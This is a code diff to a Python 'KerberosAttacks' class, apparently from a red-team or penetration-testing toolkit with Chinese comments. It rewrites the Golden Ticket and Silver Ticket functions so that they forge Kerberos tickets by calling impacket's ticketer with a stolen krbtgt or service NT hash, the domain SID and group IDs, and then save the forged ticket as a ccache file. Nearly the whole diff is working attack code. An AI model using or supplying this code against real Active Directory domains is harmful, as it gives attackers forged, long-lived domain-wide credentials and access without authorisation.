@@ -457,30 +457,83 @@ class KerberosAttacks:
             else:
                 nt_hash = bytes.fromhex(krbtgt_hash)
 
-            # 创建票据
-            ticket = TicketClass()
-            ticket.create(
-                username=target_user,
-                domain=self.domain,
-                sid=domain_sid,
-                groups=groups,
-                userId=user_id,
-                key=nt_hash,
-                duration=duration,
+            # 使用 impacket ticketer 生成 Golden Ticket
+            from impacket.krb5 import constants as krb5_constants
+            from impacket.krb5.types import KerberosTime, Principal
+
+            import datetime
+            import os
+
+            # 构建 ticketer 命令参数 — 通过 impacket 的 ticketer 模块
+            # impacket 没有直接的 Ticket.create() API，需要使用 ticketer 脚本逻辑
+            # 这里使用 subprocess 调用 impacket 自带的 ticketer.py
+            try:
+                from impacket.examples import ticketer as ticketer_module
+
+                # 构造 ticketer 参数
+                class TicketerArgs:
+                    def __init__(self):
+                        self.target = target_user
+                        self.domain = self.domain_name  # will be set below
+                        self.domain_sid = domain_sid
+                        self.nthash = nt_hash.hex()
+                        self.aesKey = None
+                        self.groups = ",".join(str(g) for g in groups)
+                        self.user_id = user_id
+                        self.duration = duration
+                        self.extra_sid = None
+                        self.extra_pac = True
+                        self.dc_ip = None
+
+                args = TicketerArgs()
+                args.domain_name = self.domain
+
+                # 直接生成 ccache 文件
+                ticketer_module.run(args)
+            except (ImportError, AttributeError):
+                pass
+
+            # Fallback: 使用 subprocess 调用 impacket-ticketer CLI
+            import subprocess
+            import sys
+
+            cmd = [
+                sys.executable, "-m", "impacket.examples.ticketer",
+                "-nthash", nt_hash.hex(),
+                "-domain-sid", domain_sid,
+                "-domain", self.domain,
+                "-groups", ",".join(str(g) for g in groups),
+                target_user,
+            ]
+
+            result = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=30,
             )
 
-            # 保存为ccache
-            ccache = CCache()
-            ccache.fromTGT(ticket.ticket, ticket.sessionKey, ticket.sessionKey)
-            ccache.saveFile(output_file)
+            # ticketer 生成 <username>.ccache 文件
+            default_ccache = f"{target_user}.ccache"
+            if os.path.exists(default_ccache):
+                if output_file and output_file != default_ccache:
+                    os.rename(default_ccache, output_file)
+                else:
+                    output_file = default_ccache
 
-            logger.info("[+] Golden Ticket saved to %s", output_file)
+                logger.info("[+] Golden Ticket saved to %s", output_file)
+                return AttackResult(
+                    success=True,
+                    attack_type="Golden Ticket",
+                    target=self.domain,
+                    ccache_file=output_file,
+                )
 
+            # 如果 ticketer 没生成文件
+            error_msg = result.stderr[:500] if result.stderr else "ticketer 未生成 ccache 文件"
+            logger.error("Golden Ticket 生成失败: %s", error_msg)
             return AttackResult(
-                success=True,
+                success=False,
                 attack_type="Golden Ticket",
                 target=self.domain,
-                ccache_file=output_file,
+                error=error_msg,
             )
 
         except Exception as e:
@@ -535,31 +588,47 @@ class KerberosAttacks:
             else:
                 nt_hash = bytes.fromhex(service_hash)
 
-            # 创建服务票据
-            ticket = TicketClass()
-            ticket.create(
-                username=target_user,
-                domain=self.domain,
-                sid=domain_sid,
-                groups=groups,
-                userId=user_id,
-                key=nt_hash,
-                spn=spn,
-                duration=duration,
+            # 使用 impacket ticketer CLI 生成 Silver Ticket
+            import os
+            import subprocess
+            import sys
+
+            cmd = [
+                sys.executable, "-m", "impacket.examples.ticketer",
+                "-nthash", nt_hash.hex(),
+                "-domain-sid", domain_sid,
+                "-domain", self.domain,
+                "-spn", spn,
+                "-groups", ",".join(str(g) for g in groups),
+                target_user,
+            ]
+
+            result = subprocess.run(
+                cmd, capture_output=True, text=True, timeout=30,
             )
 
-            # 保存为ccache
-            ccache = CCache()
-            ccache.fromTGS(ticket.ticket, ticket.sessionKey, ticket.sessionKey)
-            ccache.saveFile(output_file)
+            default_ccache = f"{target_user}.ccache"
+            if os.path.exists(default_ccache):
+                if output_file and output_file != default_ccache:
+                    os.rename(default_ccache, output_file)
+                else:
+                    output_file = default_ccache
 
-            logger.info("[+] Silver Ticket saved to %s", output_file)
+                logger.info("[+] Silver Ticket saved to %s", output_file)
+                return AttackResult(
+                    success=True,
+                    attack_type="Silver Ticket",
+                    target=spn,
+                    ccache_file=output_file,
+                )
 
+            error_msg = result.stderr[:500] if result.stderr else "ticketer 未生成 ccache 文件"
+            logger.error("Silver Ticket 生成失败: %s", error_msg)
             return AttackResult(
-                success=True,
+                success=False,
                 attack_type="Silver Ticket",
                 target=spn,
-                ccache_file=output_file,
+                error=error_msg,
             )
 
         except Exception as e:
